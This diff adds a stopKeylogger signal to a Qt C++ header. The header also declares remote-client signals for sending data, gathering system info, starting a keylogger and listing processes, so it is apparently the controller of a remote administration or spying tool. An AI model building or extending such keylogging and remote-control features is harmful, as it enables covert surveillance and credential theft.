@@ -38,6 +38,7 @@ signals:
     void sendToClient(const QString &clientId, const QByteArray &data);
     void getInfoSys(const QString &clientId);
     void startKeylogger(const QString &clientId);
+    void stopKeylogger(const QString &clientId);
     void requestProcessList(const QString &clientId, bool namesOnly);
 
 public slots:
